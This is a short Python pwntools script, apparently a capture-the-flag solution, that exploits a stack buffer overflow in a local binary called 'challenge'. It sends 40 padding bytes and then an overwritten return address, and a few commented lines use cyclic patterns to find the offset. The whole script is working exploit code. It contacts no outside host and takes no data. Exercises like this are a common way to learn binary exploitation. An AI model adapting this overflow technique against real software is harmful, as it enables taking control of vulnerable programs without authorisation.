#!/usr/bin/env python3

from pwn import *

import sys

payload = b'a' * 40 + p64(0x40057a)

p = process("./challenge")

p.sendline(payload)

print(p.recvall())

# print(cyclic(50))

# print(cyclic_find(b'aaaabaaac'[:4]))
